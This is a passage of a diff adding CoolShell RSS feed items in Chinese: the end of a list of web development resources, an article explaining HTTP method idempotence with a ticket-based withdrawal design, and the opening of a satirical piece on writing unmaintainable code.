+<li><a href="http://marijnhaverbeke.nl/uglifyjs" target="_blank"><strong>UglifyJS</strong></a>是基于NodeJS的Javascript语法解析/压缩/格式化工具，它支持任何CommonJS模块系统的Javascript平台。</li>
+<li><a href="http://www.dhteumeuleu.com/" target="_blank"><strong>Dhteumeuleu</strong></a>, 交互式的 DOM 脚本和DHTML 的开源演示。</li>
+<li><a href="https://github.com/documentcloud/backbone/" target="_blank"><strong>Backbone</strong></a>是一个前端 JS 代码 MVC 框架，被著名的 37signals 用来构建他们的移动客户端。它不可取代 Jquery，不可取代现有的Template 库。而是和这些结合起来构建复杂的 web 前端交互应用。如果项目涉及大量的 javascript 代码，实现很多复杂的前端交互功能，首先你会想到把数据和展示分离。使用 Jquery 的 selector 和 callback 可以轻松做到这点。但是对于富客户端的WEB应用大量代码的结构化组织非常必要。Backbone 就提供了 javascript 代码的组织的功能。Backbone 主要包括 models, collections, views 和 events, controller 。</li>
+</ul>
+<h4>客户端和模拟器</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="firebug" src="http://www.b2bweb.fr/wp-content/uploads/firebug.png" alt="" width="600" height="238" /></p>
+<ul>
+<li><a href="http://browsershots.org/" target="_blank"><strong>BrowserShot</strong></a>, 检查浏览器的兼容性，跨浏览器平器的测试</li>
+<li><strong><a href="http://tester.jonasjohn.de/" target="_blank">Test everything</a></strong>… 输入一个你想要测试的URL……</li>
+<li><a href="http://tmobile.modeaondemand.com/htc/g1/" target="_blank"><strong>Android browser</strong></a> 模拟器</li>
+<li><a href="http://iphonetester.com/" target="_blank"><strong>iPhone browser</strong></a> 模拟器</li>
+<li><a href="http://www.opera.com/mobile/demo/" target="_blank"><strong>Opera browser</strong></a> 模拟器</li>
+<li>★ <a href="http://getfirebug.com/whatisfirebug" target="_blank"><strong>Firebug</strong></a> 与 <strong><a href="http://www.mozilla.com/fr/firefox/" target="_blank">Firefox</a></strong> 集成，可以查看和调试你的Web页面。</li>
+</ul>
+<h3>CSS3 和 字库</h3>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="patternTap" src="http://www.b2bweb.fr/wp-content/uploads/patternTap.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://www.css3maker.com/" target="_blank"><strong>CSS3 Maker</strong></a> CCS3的生成器</li>
+<li>容易地创建 <strong><a href="http://www.sencha.com/products/animator/" target="_blank">CSS3 animations</a>。</strong> Sencha Animator 是一个桌面应用可以为WebKit浏览器和触摸式移动设备创建 CSS3 animations 。</li>
+<li><a href="http://csswarp.eleqtriq.com/" target="_blank"><strong>CSSwarp</strong></a> – CSS 文本扭曲生成器</li>
+<li><a href="http://www.colorzilla.com/gradient-editor/" target="_blank"><strong>Gradient Editor</strong></a>, 一个强大的Photoshop式的CSS 渐变编译器。来自 ColorZilla</li>
+<li>★ <a href="http://www.google.com/webfonts" target="_blank"><strong>Google Web Fonts</strong></a> 通过Google Web Fonts API 可以浏览所有的字体</li>
+<li><a href="http://www.fontsquirrel.com/fontface/generator" target="_blank"><strong>@font-face Kit Generator</strong></a>, 为Web转换字体</li>
+<li><a href="http://www.typetester.org/" target="_blank"><strong>Typetester</strong></a>, 比较字体。</li>
+<li><a href="http://mediaqueri.es/" target="_blank"><strong>Media Queries</strong></a>. 一组 responsive web 设计。</li>
+<li><a href="http://patterntap.com/" target="_blank"><strong>Pattern TAP</strong></a>, UI组件。</li>
+</ul>
+<h4>Website (FULL) 模板</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="boilerplate" src="http://www.b2bweb.fr/wp-content/uploads/boilerplate1.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://html5boilerplate.com/" target="_blank"><strong>HTML5 Boilerplate</strong></a> 是一个<a href="http://www.mhtml5.com/">HTML5 </a>/ CSS / js模板，是实现跨浏览器正常化、性能优化，稳定的可选功能如跨域Ajax和Flash的最佳实践。 项目的开发商称之为技巧集合，目的是满足您开发一个跨浏览器，并且面向未来的网站的需求。 <a href="https://github.com/paulirish/html5-boilerplate" target="_blank">Sources</a>.</li>
+<li><a href="http://sickdesigner.com/resources/HTML5-starter-pack/" target="_blank"><strong>HTML5 starter pack</strong></a> 是一个干净的和有组织的目录结构，其可适合很多项目，还有一些很常用的文件，以及简单的Photoshop设计模板。</li>
+<li>★ <a href="http://initializr.com/" target="_blank"><strong>Initializr</strong></a> 是一个HTML5 模板生成器，其可以帮你在15秒内创建一个HTML5的项目。</li>
+<li><a href="http://tympanus.net/Tutorials/AnimatedPortfolioGallery/" target="_blank"><strong>Animated Portfolio Gallery</strong></a> （<a href="http://tympanus.net/codrops/2010/11/14/animated-portfolio-gallery/" target="_blank">教程</a>）</li>
+<li> <a href="http://tutorialzine.com/2010/07/making-slick-mobileapp-website-jquery-css/" target="_blank"><strong>Slick MobileApp Website</strong></a> 如果通过 jQuery 和 CSS 制作一个手机应用的网站。</li>
+<li> <a href="http://net.tutsplus.com/tutorials/javascript-ajax/how-to-build-an-rss-reader-with-jquery-mobile-2/" target="_blank"><strong>RSS Reader</strong></a> 如果通过 jQuery Mobile 创建一个RSS Reader</li>
+<li>★ <a href="http://addyosmani.com/blog/building-spas-jquerys-best-friends/" target="_blank"><strong>Single Page Applications</strong></a> 使用jQuery的朋友们 (Backbone, Underscore, …)创建单一页面。</li>
+<li><a href="http://code.google.com/p/gtv-resources/" target="_blank"><strong>Google TV Optimized Templates</strong></a>, 传统电视已经开始和网路融合，但现阶段产业仍然正在摸索之中，为此将来的网页亦会有结构上的改变。<a href="http://code.google.com/p/gtv-resources/">Google TV Optimized Templates</a>是一个用HTML/JavaScript制成的开源软体，一如其名是一个对Google TV作出了最佳化的的网页范本，其特色是以遥控器作为操作的前提，令使用者无需输入任何文字就可以进行控制。未来除了会有专用遥控器外，还会采用智能手机透过W-iFi控制Google TV的方法。Optimized Templates的界面中左方会展示分类，右方会显示该分类下的影片截图，影片播放、切换、全画面表示都可透过键盘上的方向键、Backspace或Enter等键完成，方便今后的网站开发人员借镜。HTML5 版的模板使用了 <a href="http://code.google.com/p/gtv-ui-lib" target="_blank">Google TV UI library</a>, jQuery  和 Closure 。</li>
+</ul>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/05/Render-Process-150x150.jpg" alt="浏览器的渲染原理简介" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a></li><li ><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/11/stackparts.com_-150x150.png" alt="一些文章资源和趣闻" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_title">一些文章资源和趣闻</a></li><li ><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/09/image008-150x150.jpg" alt="一些文章和各种资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a></li><li ><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="一些有意思的贴子和工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_title">一些有意思的贴子和工具</a></li><li ><a href="https://coolshell.cn/articles/1949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg" alt="Web中的省略号" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1949.html" class="wp_rp_title">Web中的省略号</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4795.html">开源中最好的Web开发的资源</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4795.html/feed</wfw:commentRss>
+			<slash:comments>124</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>HTTP幂等性概念和应用</title>
+		<link>https://coolshell.cn/articles/4787.html</link>
+					<comments>https://coolshell.cn/articles/4787.html#comments</comments>
+		
+		<dc:creator><![CDATA[Todd]]></dc:creator>
+		<pubDate>Tue, 07 Jun 2011 00:49:01 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[HTTP]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4787</guid>
+
+					<description><![CDATA[<p>[ 感谢 Todd 同学投递本文 ] 基于HTTP协议的Web API是时下最为流行的一种分布式服务提供方式。无论是在大型互联网应用还是企业级架构中，我们都见到...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4787.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4787.html">HTTP幂等性概念和应用</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><strong>[ 感谢 <a href="http://www.cnblogs.com/weidagang2046/" target="_blank">Todd 同学</a>投递本文 ]</strong></p>
+<p>基于HTTP协议的Web API是时下最为流行的一种分布式服务提供方式。无论是在大型互联网应用还是企业级架构中，我们都见到了越来越多的SOA或RESTful的Web API。为什么Web API如此流行呢？我认为很大程度上应归功于简单有效的HTTP协议。HTTP协议是一种分布式的面向资源的网络应用层协议，无论是服务器端提供Web服务，还是客户端消费Web服务都非常简单。再加上浏览器、Javascript、AJAX、JSON以及HTML5等技术和工具的发展，互联网应用架构设计表现出了从传统的PHP、JSP、ASP.NET等服务器端动态网页向Web API + RIA（富互联网应用）过渡的趋势。Web API专注于提供业务服务，RIA专注于用户界面和交互设计，从此两个领域的分工更加明晰。在这种趋势下，Web API设计将成为服务器端程序员的必修课。然而，正如简单的Java语言并不意味着高质量的Java程序，简单的HTTP协议也不意味着高质量的Web API。要想设计出高质量的Web API，还需要深入理解分布式系统及HTTP协议的特性。</p>
+<p><strong> </strong></p>
+<p><strong> </strong></p>
+<p><strong>幂等性定义</strong></p>
+<p>本文所要探讨的正是HTTP协议涉及到的一种重要性质：幂等性(Idempotence)。在HTTP/1.1规范中幂等性的定义是：</p>
+<blockquote><p><em><span style="color: #800040;">Methods can also have the property of &#8220;idempotence&#8221; in that (aside from error or expiration issues) the side-effects of N &gt; 0 identical requests is the same as for a single request.</span></em></p></blockquote>
+<p>从定义上看，HTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用。幂等性属于语义范畴，正如编译器只能帮助检查语法错误一样，HTTP规范也没有办法通过消息格式等语法手段来定义它，这可能是它不太受到重视的原因之一。但实际上，幂等性是分布式系统设计中十分重要的概念，而HTTP的分布式本质也决定了它在HTTP中具有重要地位。</p>
+<p><span id="more-4787"></span></p>
+<p><strong> </strong></p>
+<p><strong>分布式事务 vs 幂等设计</strong></p>
+<p>为什么需要幂等性呢？我们先从一个例子说起，假设有一个从账户取钱的远程API（可以是HTTP的，也可以不是），我们暂时用类函数的方式记为</p>
+<p><code data-enlighter-language="c" class="EnlighterJSRAW">bool withdraw(account_id, amount); </code></p>
+<p>withdraw的语义是从account_id对应的账户中扣除amount数额的钱；如果扣除成功则返回true，账户余额减少amount；如果扣除失败则返回false，账户余额不变。值得注意的是：和本地环境相比，我们不能轻易假设分布式环境的可靠性。一种典型的情况是withdraw请求已经被服务器端正确处理，但服务器端的返回结果由于网络等原因被掉丢了，导致客户端无法得知处理结果。如果是在网页上，一些不恰当的设计可能会使用户认为上一次操作失败了，然后刷新页面，这就导致了withdraw被调用两次，账户也被多扣了一次钱。如图1所示：</p>
+<p style="text-align: center;"><a href="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051027575.png"><img decoding="async" loading="lazy" src="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051039636.png" border="0" alt="image" width="458" height="394" /></a></p>
+<p style="text-align: center;"><a href="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051027575.png"></a>图1</p>
+<p>这个问题的解决方案一是采用分布式事务，通过引入支持分布式事务的中间件来保证withdraw功能的事务性。分布式事务的优点是对于调用者很简单，复杂性都交给了中间件来管理。缺点则是一方面架构太重量级，容易被绑在特定的中间件上，不利于异构系统的集成；另一方面分布式事务虽然能保证事务的ACID性质，而但却无法提供性能和可用性的保证。</p>
+<p>另一种更轻量级的解决方案是幂等设计。上面的withdraw显然不满足幂等性，但我们可以一些技巧将它变成幂等的，比如：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">int create_ticket();
+
+bool idempotent_withdraw(ticket_id, account_id, amount);</pre>
+<p>create_ticket的语义是获取一个服务器端生成的唯一的处理号ticket_id，它将用于标识后续的操作。idempotent_withdraw和withdraw的区别在于关联了一个ticket_id，一个ticket_id表示的操作至多只会被处理一次，每次调用都将返回第一次调用时的处理结果。这样，idempotent_withdraw就符合幂等性了，客户端就可以放心地多次调用。</p>
+<p>基于幂等性的解决方案中一个完整的取钱流程被分解成了两个步骤：1.调用create_ticket()获取ticket_id；2.调用idempotent_withdraw(ticket_id, account_id, amount)。虽然create_ticket不是幂等的，但在这种设计下，它对系统状态的影响可以忽略，加上idempotent_withdraw是幂等的，所以任何一步由于网络等原因失败或超时，客户端都可以重试，直到获得结果。如图2所示：</p>
+<p><a href="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051059820.png"><img decoding="async" loading="lazy" class="aligncenter" src="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051069339.png" border="0" alt="image" width="610" height="578" /></a></p>
+<p style="text-align: center;">图2</p>
+<p><strong> </strong></p>
+<p>和分布式事务相比，幂等设计的优势在于它的轻量级，容易适应异构环境，以及性能和可用性方面。在某些性能要求比较高的应用，幂等设计往往是唯一的选择。</p>
+<p><strong> </strong></p>
+<p><strong>HTTP的幂等性</strong></p>
+<p>HTTP协议本身是一种面向资源的应用层协议，但对HTTP协议的使用实际上存在着两种不同的方式：一种是RESTful的，它把HTTP当成应用层协议，比较忠实地遵守了HTTP协议的各种规定；另一种是SOA的，它并没有完全把HTTP当成应用层协议，而是把HTTP协议作为了传输层协议，然后在HTTP之上建立了自己的应用层协议。本文所讨论的HTTP幂等性主要针对RESTful风格的，不过正如上一节所看到的那样，幂等性并不属于特点的协议，它是分布式系统的一种特性；所以，不论是SOA还是RESTful的Web API设计都应该考虑幂等性。下面将介绍HTTP GET、DELETE、PUT、POST四种主要方法的语义和幂等性。</p>
+<p>HTTP GET方法用于获取资源，不应有副作用，所以是幂等的。比如：GET http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。</p>
+<p>HTTP DELETE方法用于删除资源，有副作用，但它应该满足幂等性。比如：DELETE http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引入错误。</p>
+<p>比较容易混淆的是HTTP POST和PUT。POST和PUT的区别容易被简单地误认为“POST表示创建资源，PUT表示更新资源”；而实际上，二者均可用于创建资源，更为本质的差别是在幂等性方面。在HTTP规范中对POST和PUT是这样定义的：</p>
+<blockquote><p><span style="color: #800040;"><em>The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line. &#8230;&#8230; </em><em>If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header.</em></span></p>
+<p><em><span style="color: #800040;">The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.</span></em></p></blockquote>
+<p>POST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。</p>
+<p>而PUT所对应的URI是要创建或更新的资源本身。比如：PUT http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。</p>
+<p>在介绍了几种操作的语义和幂等性之后，我们来看看如何通过Web API的形式实现前面所提到的取款功能。很简单，用POST /tickets来实现create_ticket；用PUT /accounts/account_id/ticket_id&amp;amount=xxx来实现idempotent_withdraw。值得注意的是严格来讲amount参数不应该作为URI的一部分，真正的URI应该是/accounts/account_id/ticket_id，而amount应该放在请求的body中。这种模式可以应用于很多场合，比如：论坛网站中防止意外的重复发帖。</p>
+<p><strong> </strong></p>
+<p><strong>总结</strong></p>
+<p>上面简单介绍了幂等性的概念，用幂等设计取代分布式事务的方法，以及HTTP主要方法的语义和幂等性特征。其实，如果要追根溯源，幂等性是数学中的一个概念，表达的是N次变换与1次变换的结果相同，有兴趣的读者可以从<a href="http://en.wikipedia.org/wiki/Idempotence">Wikipedia</a>上进一步了解。</p>
+<p><strong> </strong></p>
+<p><strong>参考</strong></p>
+<p><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html">RFC 2616, Hypertext Transfer Protocol &#8212; HTTP/1.1, Method Definitions</a></p>
+<p><a href="http://devhawk.net/2007/11/09/the-importance-of-idempotence/">The Importance of Idempotence</a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/10/HTTP-770x513-300x200-1-150x150.jpg" alt="HTTP的前世今生" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_title">HTTP的前世今生</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/8767.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/webtoolbox-150x150.jpg" alt="Web工程师的工具箱" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8767.html" class="wp_rp_title">Web工程师的工具箱</a></li><li ><a href="https://coolshell.cn/articles/2367.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/04/URL-BAR-150x150.png" alt="谷歌Chrome取消&#8221;http://&#8221;" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2367.html" class="wp_rp_title">谷歌Chrome取消&#8221;http://&#8221;</a></li><li ><a href="https://coolshell.cn/articles/1480.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg" alt="非常简单的Python HTTP服务" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1480.html" class="wp_rp_title">非常简单的Python HTTP服务</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4787.html">HTTP幂等性概念和应用</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4787.html/feed</wfw:commentRss>
+			<slash:comments>37</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>如何写出无法维护的代码</title>
+		<link>https://coolshell.cn/articles/4758.html</link>
+					<comments>https://coolshell.cn/articles/4758.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 03 Jun 2011 00:52:42 +0000</pubDate>
+				<category><![CDATA[C/C++语言]]></category>
+		<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[C++]]></category>
+		<category><![CDATA[Coding]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4758</guid>
+
+					<description><![CDATA[<p>酷壳里有很多我觉得很不错的文章，但是访问量最大的却是那篇《6个变态的Hello World》，和它能在本站右边栏“全站热门”中出现的还有“如何加密源代码”，以及...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4758.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4758.html">如何写出无法维护的代码</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>酷壳里有很多我觉得很不错的文章，但是访问量最大的却是那篇《<a title="6个变态的C语言Hello World程序" href="https://coolshell.cn/articles/914.html" target="_blank">6个变态的Hello World</a>》，和它能在本站右边栏“<strong>全站热门</strong>”中出现的还有“<a title="如何加密/混乱C源代码" href="https://coolshell.cn/articles/933.html" target="_blank">如何加密源代码</a>”，以及<a title="编程真难啊" href="https://coolshell.cn/articles/1391.html" target="_blank">编程真难啊</a>等这样的文章。可见本站的读者们的偏好，我也相信你们都是“身怀绝技”的程序员。所以，今天给大家推荐这篇文章，相信一定能触动大家的兴奋点。</p>
+<p>这篇文章的原文在这里（<a href="http://mindprod.com/jgloss/unmain.html" target="_blank">http://mindprod.com/jgloss/unmain.html</a>），我看完后我想说——</p>
+<ol>
+<li><strong>什么叫“创造力”，创造力就是——就算是要干一件烂事都能干得那么漂亮那么有创意的能力。</strong></li>
+<li><strong>什么叫“抓狂”，抓狂就是——以一种沉着老练的不屈不挠的一本正经的精神一点一点把你推向崩溃的边缘</strong>。</li>
+</ol>
+<p>我把文章节选了一些，也并没有完全翻译，简译一下，也加入了一些自己的调侃。对于有下面这些编程习惯的朋友，请大家对号入座。另外，维护程序的朋友们，你们死定了！！</p>
+<blockquote><p><img decoding="async" loading="lazy" src="http://mindprod.com/image/icon64/woodpecker.png" alt="woodpecker" width="64" height="64" align="left" border="0" />If builders built buildings the way programmers write programs, then the first woodpecker that came along would destroy civilization. （如果建筑师盖房子就像程序员写程序一样，那么，第一只到来的啄木鸟就能毁掉我们的文明）</p>
+<p>~ Gerald Weinberg (born: 1933-10-27 age: 77) <a href="http://www.geraldmweinberg.com/Site/Home.html">Weinberg’s Second Law</a></p></blockquote>
+<h4>程序命名</h4>
+<ul>
+<li><strong>容易输入的名字</strong>。比如：Fred，asdf</li>
+<li><strong>单字母的变量名</strong>。比如：a,b,c, x,y,z（陈皓注：如果不够用，可以考虑a1,a2,a3,a4,&#8230;.）</li>
+<li><strong>有创意地拼写错误</strong>。比如：SetPintleOpening， SetPintalClosing。这样可以让人很难搜索代码。</li>
+<li><strong>抽象</strong>。比如：ProcessData, DoIt, GetData&#8230; 抽象到就跟什么都没说一样。</li>
+<li><strong>缩写</strong>。比如：WTF，RTFSC …… （陈皓注：使用拼音缩写也同样给力，比如： BT，TMD，TJJTDS）</li>
+<li><strong>随机大写字母</strong>。比如：gEtnuMbER..</li>
+<li><strong>重用命名</strong>。在内嵌的语句块中使用相同的变量名有奇效。</li>
+<li><strong>使用重音字母</strong>。比如：int  ínt（注：第二个 ínt不是int）</li>
+<li><strong>使用下划线</strong>。比如：_, __, ___。</li>
+<li><strong>使用不同的语言</strong>。比如混用英语，德语，或是中文拼音。</li>
+<li><strong>使用字符命名</strong>。比如：slash, asterix, comma&#8230;</li>
+<li><strong>使用无关的单词</strong>。比如：god, superman, iloveu&#8230;.</li>
+<li><strong>混淆l和1</strong>。字母l和数字1有时候是看不出来的。</li>
+</ul>
+<h4><span id="more-4758"></span>伪装欺诈</h4>
+<ul>
+<li><strong>把注释和代码交织在一起</strong>。</li>
+</ul>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">for(j=0; j&lt;array_len; j+ =8)
+{
+    total += array[j+0 ];
+    total += array[j+1 ];
+    total += array[j+2 ]; /* Main body of
+    total += array[j+3]; * loop is unrolled
+    total += array[j+4]; * for greater speed.
+    total += array[j+5]; */
+    total += array[j+6 ];
+    total += array[j+7 ];
+}</pre>
+<ul>
+<li><strong>隐藏宏定义</strong>。如：#define a=b a=0-b，当人们看到a=b时，谁也想不到那是一个宏。</li>
+</ul>
+<ul>
+<li><strong>换行</strong>。如下所示，下面的示例使用搜索xy_z变得困难。</li>
+</ul>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#define local_var xy\
+_z // local_var OK</pre>
+<ul>
+<li><strong>代码和显示不一致</strong>。比如，你的界面显示叫postal code，但是代码里确叫 zipcode.</li>
+</ul>
+<ul>
+<li><strong>隐藏全局变量</strong>。把使用全局变量以函数参数的方式传递给函数，这样可以让人觉得那个变量不是全局变量。</li>
+</ul>
+<ul>
+<li><strong>使用同意词</strong>。如：</li>
+</ul>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#define xxx global_var // in file std.h&amp;nbsp;
+#define xy_z xxx // in file ..\other\substd.h&amp;nbsp;
+#define local_var xy_z // in file ..\codestd\inst.h</pre>
+<ul>
+<li><strong>使用相似的变量名</strong>。如：单词相似，swimmer 和 swimner，字母相似：ilI1| 或 oO08。parselnt 和 parseInt， D0Calc 和 DOCalc。还有这一组：xy_Z, xy__z, _xy_z, _xyz, XY_Z, xY_z, Xy_z。</li>
+</ul>
+<ul>
+<li><strong>重载函数</strong>。使用相同的函数名，但是其功能和具体实现完全没有关系。</li>
+</ul>
+<ul>
+<li><strong>操作符重载</strong>。重载操作符可以让你的代码变得诡异，感谢CCTV，感谢C++。这个东西是可以把混乱代码提高到一种艺术的形式。比如：重载一个类的 ! 操作符，但实际功能并不是取反，让其返回一个整数。于是，如果你使用 ! ! 操作符，那么，有意思的事就发生了—— 先是调用类的重载 ! 操作符，然后把其返回的整数给 ! 成了 布尔变量，如果是 !!! 呢？呵呵。</li>
+</ul>
+<ul>
+<li><strong>#define</strong>。看过本站那些混乱代码的文章，你都会知道宏定义和预编译对于写出不可读的代码的重大意义。不过，一个具有想像力的东西是——在头文件中使用预编译来查看这个头文件被include了几次，而被include不同的次数时，其中的函数定义完全不一样。</li>
+</ul>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#ifndef DONE
+#ifdef TWICE
+// put stuff here to declare 3rd time around
+void g(char* str);
+#define DONE
+#else // TWICE
+#ifdef ONCE
+// put stuff here to declare 2nd time around&lt;
+void g(void* str);
+#define TWICE
+#else // ONCE
+// put stuff here to declare 1st time around
+void g(std::string str);
+#define ONCE
+#endif // ONCE
+#endif // TWICE
+#endif // DONE</pre>
+<h4>文档和注释</h4>
+<ul>
+<li><strong>在注释中撒谎</strong>。你不用真的去撒谎，只需在改代码的时候不要更新注释就可以了。</li>
+<li><strong>注释明显的东西</strong>。比如：/* add 1 to i */。（参看本站的“<a title="五种应该避免的代码注释" href="https://coolshell.cn/articles/2746.html" target="_blank">五种应该避免的注释</a>”）</li>
